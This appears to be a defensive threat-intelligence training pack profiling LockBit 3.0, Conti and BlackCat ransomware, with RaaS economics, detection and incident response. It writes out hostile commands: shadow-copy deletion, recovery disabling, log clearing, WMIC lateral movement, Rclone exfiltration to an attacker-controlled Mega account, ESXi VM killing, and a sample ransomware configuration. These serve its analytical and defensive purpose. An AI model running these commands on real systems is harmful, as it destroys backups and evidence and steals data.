@@ -1,0 +1,330 @@
+================================================================================
+TITAN AI — TRAINING PACK 043: RANSOMWARE GROUPS — TECHNICAL TTPs AND ECONOMICS
+LOCKBIT 3.0, CONTI, BLACKCAT/ALPHV, AFFILIATE MODEL, ENCRYPTION ANALYSIS, RESPONSE
+================================================================================
+
+================================================================================
+PART 1: RANSOMWARE ECOSYSTEM STRUCTURE
+================================================================================
+
+--- RANSOMWARE-AS-A-SERVICE (RAAS) MODEL ---
+
+STRUCTURE:
+  Developer/Core Team: Write and maintain the ransomware. Maintain infrastructure.
+  Affiliates: Carry out intrusions. Deploy ransomware. ~75-80% of ransom paid to affiliate.
+  Brokers: Initial Access Brokers (IABs) sell network access. Affiliates buy.
+  Money mules: Launder ransom payments. 10-20% of laundering fee.
+  
+WHY THIS MODEL WORKS:
+  Developer: Passive income. Never touch victim systems. Lower arrest risk.
+  Affiliate: Get powerful tool without development cost. Focus on intrusion skills.
+  Separation: Law enforcement takes down affiliates, developers restart with new brand.
+  
+INITIAL ACCESS BROKERS (IABs):
+  Sell: RDP access, VPN credentials, web shells, domain admin access.
+  Markets: XSS, Exploit.in forums. Prices: $100 (RDP) to $50,000+ (DA access to large org).
+  Most common products: Corporate VPN credentials (from phishing/credential stuffing).
+  
+DOUBLE EXTORTION (post-2019 standard):
+  Encrypt files AND exfiltrate data.
+  Two leverage points:
+  1. "Pay to decrypt" — restore operations.
+  2. "Pay to not publish" — avoid regulatory fines, reputational damage.
+  
+  Leak sites: Tor .onion sites. Post victim name, evidence, countdown timer, then full dump.
+  
+TRIPLE EXTORTION:
+  Add: DDoS on victim's infrastructure during negotiations.
+  Or: Contact victim's customers/partners directly demanding they pressure victim to pay.
+
+--- RANSOM ECONOMICS ---
+
+Average ransom demand (2023-2024): $1.5M (enterprise targets).
+Average payment (when paid): $850,000 (typically negotiate 40-60% of demand).
+Recovery cost without paying: $1.82M average (Sophos 2023 report).
+  Includes: IT overtime, forensics, legal, hardware replacement, rebuilding.
+  Does NOT include: Regulatory fines, reputational damage, customer loss.
+
+Payment method: Bitcoin (traceable), Monero (preferred, less traceable).
+LockBit: Demanded Bitcoin. BlackCat: Required Monero (harder to trace).
+Notable: Colonial Pipeline paid $4.4M. Recovered ~$2.3M via FBI (private key seizure).
+JBS Foods: Paid $11M. Unknown recovery.
+
+================================================================================
+PART 2: LOCKBIT 3.0 — TECHNICAL ANALYSIS
+================================================================================
+
+--- BACKGROUND ---
+
+LockBit: Most prolific ransomware gang 2022-2024.
+Variants: LockBit 1.0 → LockBit 2.0 (Redline) → LockBit 3.0 (Black) → LockBit Green.
+LockBit 3.0: Incorporated code from BlackMatter. Highly sophisticated.
+February 2024: "Operation Cronos" — Europol/FBI takedown. Infrastructure seized.
+April 2024: LockBit attempted relaunch. Severely degraded.
+
+LOCKBIT 3.0 TECHNICAL PROFILE:
+
+Encryption:
+  AES-256 (symmetric) per-file + RSA-2048 or ECC to protect the AES key.
+  Hybrid encryption: Fast file encryption (AES), secure key exchange (RSA/ECC).
+  Key structure: Master public key (RSA) hardcoded. Each run: Random RSA keypair.
+  Each victim: Unique encryption key. Decryption requires affiliate's private key.
+  
+  Encryption mode: Uses intermittent encryption on large files (encrypt only first X MB or alternating blocks).
+  Speed: Significantly faster than full file encryption. Reduced detection window.
+  Threading: Multi-threaded. I/O completion ports (IOCP). Encrypt as many files simultaneously as possible.
+
+Initial Access (observed TTPs):
+  - ProxyShell (Exchange CVE-2021-34473, 34523, 31206) — still hits unpatched orgs
+  - Fortinet VPN zero-days (CVE-2022-40684)
+  - RDP brute force / stolen credentials
+  - Phishing email → macro → Cobalt Strike → LockBit
+  - Purchased access from IAB
+
+Privilege Escalation:
+  UAC bypass techniques (multiple; auto-selected based on OS version).
+  PrintNightmare (CVE-2021-1675/34527) when available.
+  Token impersonation (SeImpersonatePrivilege).
+
+Defense Evasion:
+  AV/EDR termination: Kills known AV processes before encryption.
+    360 Total Security, Windows Defender, MalwareBytes, Carbon Black, SentinelOne, Cylance, etc.
+    Uses: custom kill list of process names. Terminates via TerminateProcess API.
+  
+  Service termination: Stops database services (SQL Server, MySQL, Oracle) to release file locks.
+  Backup deletion:
+    vssadmin delete shadows /all /quiet
+    wmic shadowcopy delete
+    bcdedit /set {default} recoveryenabled no
+    bcdedit /set {default} bootstatuspolicy ignoreallfailures
+  
+  Log clearing: wevtutil cl Security; wevtutil cl System; wevtutil cl Application
+  
+  Wallpaper: Sets custom wallpaper with LockBit branding + demand.
+
+Self-Propagation:
+  SMB: Enumerate network shares, spread to accessible systems.
+  GPO abuse: If Domain Admin, push ransomware via Group Policy.
+  WMIC lateral movement: wmic /node:TARGET process call create "binary.exe"
+
+Anti-Analysis:
+  String obfuscation: XOR-encoded strings decoded at runtime.
+  API hashing: Windows API functions found by hash, not name. (import-less execution)
+  Timing checks: RDTSC, sleep calls to detect fast sandboxes.
+  Custom packer: Entry point leads to unpacker stub.
+
+BUG BOUNTY PROGRAM:
+  LockBit 3.0 offered $1,000-$1,000,000 for bugs in their ransomware. Marketing stunt but real program.
+
+================================================================================
+PART 3: CONTI — ANATOMY OF A CRIMINAL ORGANIZATION
+================================================================================
+
+--- CONTI LEAK (FEBRUARY 2022) ---
+
+After Conti sided with Russia after Ukraine invasion:
+Ukrainian security researcher leaked 60,000+ Conti internal Jabber (XMPP) messages.
+Complete picture of criminal organization's operations exposed.
+
+KEY FINDINGS FROM LEAK:
+  Structure: 100+ employees. Full organizational chart.
+  HR: Job postings, salaries ($1,500-$2,000/month for coders in Eastern Europe).
+  Management: Team leads, deadlines, performance reviews.
+  Finance: Cryptocurrency wallets, money laundering operations.
+  Technical teams: Developers, penetration testers, negotiators, support.
+  
+  Negotiation team: Dedicated team that handles victim negotiations.
+  Tone analysis: Instructed to gauge victim's financial state. Rich org = higher demand.
+  Time pressure: Threatened to call victim's customers if negotiations stalled.
+  Payment tracking: Spreadsheets tracking each victim's ransom status.
+
+CONTI TECHNICAL PROFILE:
+
+Encryption: ChaCha20 (symmetric) + RSA-4096 (key protection).
+Notable difference from LockBit: Full file encryption (slower but thorough).
+
+Conti Playbooks (leaked alongside chats):
+  Complete step-by-step guides for affiliates covering:
+  1. Initial access techniques (ProxyLogon, ProxyShell, BlueGate, etc.)
+  2. Cobalt Strike deployment and configuration
+  3. Lateral movement methodology
+  4. Domain Admin escalation
+  5. Data exfiltration using Rclone (to Mega.nz or Dropbox)
+  6. Deploying ransomware payload
+  7. Evidence cleanup
+  
+  Rclone exfiltration configuration (from leaked playbooks):
+  rclone config create remote mega user:attacker@email.com pass:PASSWORD
+  rclone copy C:\Users\Administrator\Documents remote:stolen_data
+  rclone copy \\FILESERVER\SHARE remote:stolen_data
+  # Exfiltrates to Mega.nz cloud. Typically gigabytes before encryption.
+
+TrickBot partnership:
+  Conti had close relationship with TrickBot gang.
+  TrickBot: Banking trojan → evolved into dropper for Conti ransomware.
+  Pipeline: TrickBot infection → Cobalt Strike → Conti deployment.
+  Post-TrickBot: Transition to BazarLoader/BazarBackdoor for initial access.
+
+================================================================================
+PART 4: BLACKCAT/ALPHV — NEXT GENERATION
+================================================================================
+
+--- BLACKCAT TECHNICAL PROFILE ---
+
+BlackCat/ALPHV: First major ransomware written in Rust. Cross-platform (Windows, Linux, ESXi).
+2021-2024. Disrupted by FBI December 2023. ALPHV subsequently "exit scammed" affiliates.
+
+WHY RUST:
+  Performance: Fast compilation to native code. Efficient encryption.
+  Cross-platform: Compile once for Windows, Linux (attack VMware ESXi hosts directly).
+  Memory safety: Harder to analyze (no RTTI type info, different binary structure).
+  No legacy overhead: Clean modern codebase.
+
+BLACKCAT UNIQUE FEATURES:
+
+ESXi encryption:
+  Target VMware ESXi hypervisors directly. Encrypt ALL VMs simultaneously.
+  One ransomware deployment → dozens of VMs encrypted.
+  More devastating than encrypting each VM separately.
+  
+  ESXi targeting:
+  esxcli vm process list    # List all running VMs
+  esxcli vm process kill -t soft -w WORLD_ID  # Graceful shutdown
+  # Then encrypt .vmdk (virtual disk), .vmx (config), .nvram files.
+
+PowerShell-less / LOLBins:
+  Extensive use of Windows native tools. Minimal custom binary footprint.
+  PSEXEC, WMI, scheduled tasks for lateral movement.
+  Rclone for exfiltration (signed, legitimate binary).
+
+Data exfiltration pipeline:
+  1. Rclone configured to attacker's storage (Mega, Dropbox, SFTP server)
+  2. Selective targeting: Documents, databases, source code, backups
+  3. Volume: 100GB - multi-TB depending on target size
+
+Configuration file:
+  BlackCat is highly configurable via JSON:
+  {
+    "config_id": "abcd1234",
+    "public_key": "BASE64_RSA_PUBLIC_KEY",
+    "extension": ".blackcat",
+    "note_file_name": "RECOVER-${ext}-FILES.txt",
+    "note_full_text": "Ransom note content...",
+    "kill_processes": ["sql", "backup", "veeam", "exchange"],
+    "kill_services": ["MSSQLSERVER", "BackupExec"],
+    "exclude_directory_names": ["windows", "system32", "program files"],
+    "exclude_file_extensions": [".dll", ".exe", ".lnk", ".bat"],
+    "enable_network_discovery": true,
+    "enable_self_propagation": true
+  }
+
+Change Healthcare Attack (2024):
+  ALPHV affiliate attacked Change Healthcare (subsidiary of UnitedHealth).
+  ALPHV claimed $22M payment was made. Then ALPHV exit scammed: Took $22M, shut down, left affiliate.
+  Affiliate furious: Posted data themselves to a new extortion group.
+  Impact: Healthcare payment processing disrupted for months. Largest US healthcare breach.
+
+================================================================================
+PART 5: DETECTION AND RESPONSE
+================================================================================
+
+--- PRE-ENCRYPTION INDICATORS ---
+
+BEHAVIORAL SIGNATURES (detectable before full encryption):
+
+Volume Shadow Copy deletion (Event ID for process creation):
+  ParentProcess ∈ {wscript.exe, cmd.exe, powershell.exe}
+  AND CommandLine CONTAINS "vssadmin" AND "delete"
+  → CRITICAL: Stop and investigate immediately.
+
+AV/EDR process termination:
+  Process TerminateProcess() targeting security tool processes.
+  Detect: Unexpected process termination of security software.
+
+Rapid file modification:
+  File entropy increase: Files with low entropy → high entropy (encrypted).
+  Rate: Hundreds of files per second. Windows directory should have normal rate.
+  Tool: CrowdStrike Falcon "ransomware detection" module.
+
+Ransomware-specific file extension creation:
+  Monitor for creation of .locked, .encrypted, .blackcat, .lockbit, etc.
+  Honeypot files: Place fake "important" files in common locations. Any modification → alert.
+
+Backup deletion activity:
+  bcdedit, vssadmin, wmic shadowcopy delete in same session = high confidence ransomware.
+
+Network share enumeration:
+  net view, net use, WNetEnumResource API calls at high rate = lateral movement prep.
+
+SIGMA RULES FOR RANSOMWARE PRE-INDICATORS:
+  title: Shadow Copy Deletion
+  detection:
+    selection:
+      EventID: 4688
+      CommandLine|contains:
+        - 'vssadmin.exe delete shadows'
+        - 'wmic shadowcopy delete'
+        - 'wbadmin delete catalog'
+        - 'bcdedit /set {default} recoveryenabled no'
+    condition: selection
+  level: critical
+
+--- INCIDENT RESPONSE — RANSOMWARE ---
+
+STEP 1 (T=0): Detection — encrypted files or ransom note found.
+  DO NOT TURN OFF MACHINES: Memory forensics valuable. Some ransomware processes still running.
+  DO: Isolate network immediately. Pull cable or change VLAN.
+  DO: Take memory snapshots of running machines (volatility later).
+
+STEP 2 (T+0-2 hours): Scope assessment.
+  How many machines encrypted?
+  Is AD (Domain Controller) affected? If yes: Severity critical.
+  Is backup system affected? (Veeam, NetBackup, Backup Exec servers?)
+  Timeline: When did encryption start? How far back are unaffected backups?
+
+STEP 3 (T+2-12 hours): Preserve evidence.
+  Forensic images of key systems (patient zero, DC, key servers).
+  CloudTrail/Azure Activity Logs/Splunk logs exported.
+  Network flow logs exported.
+  All communication logged (negotiations).
+  
+  Law enforcement engagement: FBI (US), NCA (UK), BKA (Germany).
+  Benefits: May have decryption keys from prior takedowns (e.g., Hive ransomware — FBI had keys).
+  Required: For cyber insurance claims.
+
+STEP 4: Recovery decision.
+  Option A: Pay ransom → Risk: No guarantee of decryption. Fund criminal operations.
+  Option B: Restore from backup → Requires: Clean, unencrypted backups exist.
+  Option C: Rebuild from scratch → Time-consuming but guaranteed clean.
+  
+  Check: No-More-Ransom (nomoreransom.org): Free decryption tools for many families.
+
+BACKUP RECOVERY REQUIREMENTS:
+  Backups must be: Immutable (cannot be deleted/modified even by ransomware/admin).
+  Backups must be: Offline or air-gapped (network-isolated backup target).
+  3-2-1 rule: 3 copies, 2 different media, 1 offsite.
+  3-2-1-1-0: + 1 offline copy, 0 errors on restore testing.
+  
+  Modern ransomware specifically targets:
+  Veeam backup repositories
+  NetBackup/Backup Exec servers
+  StorageCraft
+  Synology/QNAP NAS (via SMB)
+  Azure Backup (if admin creds compromised)
+  
+  Protection: Veeam "immutable backups" to object storage (S3 with Object Lock).
+  Object Lock (WORM): Files cannot be modified or deleted for retention period.
+  Even with Domain Admin: Cannot delete object-locked backup files.
+
+================================================================================
+END OF PACK 043: RANSOMWARE GROUPS TTPs
+Total: RaaS model economics (developer/affiliate/IAB/money mule structure, average
+ransom amounts), LockBit 3.0 full technical profile (intermittent encryption, IOCP
+threading, AV termination list, backup deletion, self-propagation via GPO, anti-analysis),
+Conti organizational structure from leaked chats (HR/finance/negotiators), Conti leaked
+playbooks with Rclone exfiltration commands, BlackCat/ALPHV in Rust (ESXi targeting,
+configuration JSON, Change Healthcare breach), pre-encryption behavioral detection
+(shadow copy deletion Sigma rule, entropy monitoring, honeypot files), IR playbook
+(T=0 isolation to recovery decision), backup protection (3-2-1-1-0, object storage
+WORM, what ransomware targets).
+================================================================================
